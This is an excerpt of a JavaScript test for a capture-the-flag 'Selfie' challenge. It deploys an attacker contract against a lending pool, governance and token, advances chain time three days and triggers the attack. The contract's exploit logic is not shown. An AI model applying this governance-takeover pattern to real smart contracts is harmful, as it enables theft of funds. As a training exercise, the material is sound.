...
describe("[Challenge] Selfie", function () {
  ...
  it("Exploit", async function () {
    ...
    const HackSelfieFactory = await ethers.getContractFactory("HackSelfie");
    const hack = await HackSelfieFactory.deploy(
      this.pool.address,
      this.governance.address,
      this.token.address
    );
    ...
    await network.provider.send("evm_increaseTime", [24 * 60 * 60 * 3]);
    await hack.connect(attacker).attack2();
  });
